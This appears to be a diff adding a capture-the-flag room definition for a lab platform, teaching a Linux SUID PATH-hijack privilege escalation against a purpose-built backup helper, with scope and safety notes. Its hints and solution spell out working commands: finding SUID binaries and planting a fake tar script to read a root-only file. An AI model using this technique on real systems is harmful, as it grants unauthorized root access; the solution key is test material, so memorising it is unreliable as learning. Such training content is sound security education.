@@ -1,0 +1,89 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: path-of-least-resistance
+  title: 'Path of Least Resistance'
+  version: 1.0.0
+  difficulty: easy
+  points: 175
+  estimated_minutes: 25
+  tags: [ssh, linux, suid, path-hijack]
+spec:
+  track: linux-networking
+  type: challenge
+  summary: >-
+    A homegrown SUID backup helper shells out to tar without spelling out
+    where tar lives, so the shell resolves it through PATH. Because the
+    learner controls a directory on that PATH, whatever answers to the
+    name tar runs with the helper's privileges. You will find the
+    helper, confirm how it calls out, plant your own tar, and read a
+    root-only file.
+  objectives:
+    - 'Identify SUID binaries with find and inspect how they invoke other programs.'
+    - 'Explain why system() resolves command names through the inherited PATH.'
+    - 'Hijack an unresolved command name through a writable PATH directory and capture /root/flag.txt.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'ssh://target:22'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      sshd requires setuid and DAC overrides for privilege separation and
+      the learner shell; capabilities are bounded to the ssh server profile.
+      Disposable Debian container on an internal lab network. sshd must run as
+      root inside the container because binding port 22 and privilege
+      separation require it; login sessions drop to unprivileged learner
+      (uid 1000). The image ships a minimal python3 solely because the harness TCP healthcheck execs python3 inside targets. The SUID binary is a purpose-built lab
+      helper confined to this container; its intended abuse reads one
+      flag file through a fake tar script owned by the learner.
+  target:
+    privilege_profile: elevated
+    build_context: ./target
+    ports: [22]
+    healthcheck:
+      tcp_port: 22
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: path-hijack-tar
+      title: 'Answer the call for tar yourself'
+      prompt: >-
+        Log in with the account from the banner and inventory the SUID
+        binaries on the box. One of them is not part of Debian at all.
+        Read how it works, then make sure that when it asks the system
+        for tar it gets a program of your choosing instead. Have your
+        stand-in print /root/flag.txt and submit the FLAG value from the
+        helper output.
+      points: 175
+      hints:
+        - cost: 0
+          text: 'find / -perm -4000 -type f 2>/dev/null lists every SUID binary. Compare what you see against the usual Debian set and one entry under /usr/local/bin will look unfamiliar.'
+        - cost: 10
+          text: 'strings /usr/local/bin/backupctl shows the exact shell line it runs: tar is called with no absolute path, so whichever tar appears first in PATH wins.'
+        - cost: 25
+          text: 'Create ~/bin/tar containing #!/bin/sh and cat /root/flag.txt, mark it executable, then run PATH="$HOME/bin:$PATH" backupctl. The helper prints the FLAG value itself.'
+      solution: |
+        1. SSH in as learner (password learner).
+        2. Enumerate SUID binaries: `find / -perm -4000 -type f
+           2>/dev/null`. The list includes /usr/local/bin/backupctl,
+           which does not belong to any package (`dpkg -S` confirms).
+        3. Inspect it: `strings /usr/local/bin/backupctl` reveals a
+           system() call with `tar -czf ...` and no absolute path.
+        4. Prepare the hijack. Create a writable directory that you can
+           place ahead on PATH:
+           `mkdir -p "$HOME/bin"` then write `$HOME/bin/tar` containing:
+           #!/bin/sh
+           cat /root/flag.txt
+           Mark it executable with chmod 755. On Debian, ~/.profile
+           already prepends ~/bin to PATH for new login shells, or you
+           can set it inline for a single run.
+        5. Trigger the helper with the hijacked lookup order:
+           `PATH="$HOME/bin:$PATH" /usr/local/bin/backupctl`. The helper
+           runs as root, its shell resolves tar to your script first,
+           and your script prints FLAG{...}. Submit the value.
+      validator:
+        type: per_session_flag
